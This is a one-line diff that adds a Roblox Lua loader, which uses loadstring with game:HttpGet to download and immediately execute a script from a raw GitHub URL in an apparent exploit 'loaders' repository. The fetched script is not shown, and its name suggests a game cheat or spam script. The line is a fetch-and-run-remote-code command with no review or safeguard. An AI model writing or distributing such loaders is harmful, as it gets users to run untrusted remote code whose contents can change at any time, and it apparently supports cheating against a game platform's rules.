@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/the-eternal-abyss-spam4-82r1dp4igsp57w.lua"))()
